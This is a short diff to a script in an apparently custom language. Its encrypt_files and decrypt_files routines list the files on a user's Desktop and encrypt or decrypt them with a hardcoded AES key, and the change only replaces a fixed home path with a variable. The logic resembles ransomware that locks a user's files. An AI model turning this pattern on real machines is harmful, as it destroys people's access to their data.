@@ -27,7 +27,7 @@ c decrypt_files {
     crypto::set_aes_key("hiveXXXXXXXXXXXX")
     crypto::set_method("aes")    
     
-    system::list_dir(${"file", "/home/€666€/Desktop"}$) @ Puts the result into €1€ @
+    system::list_dir(${"file", "€40€/Desktop"}$) @ Puts the result into €1€ @
     foreach("€2€"):
         crypto::add_target("€13€") @ Add each file to our target list @
     end foreach
@@ -40,7 +40,7 @@ b encrypt_files {
     crypto::set_aes_key("hiveXXXXXXXXXXXX")
     crypto::set_method("aes")
 
-    system::list_dir(${"file", "/home/€666€/Desktop"}$) @ Puts the result into €1€ @
+    system::list_dir(${"file", "€40€/Desktop"}$) @ Puts the result into €1€ @
     foreach("€1€"):
         crypto::add_target("€13€") @ Add each file to our target list @
     end foreach
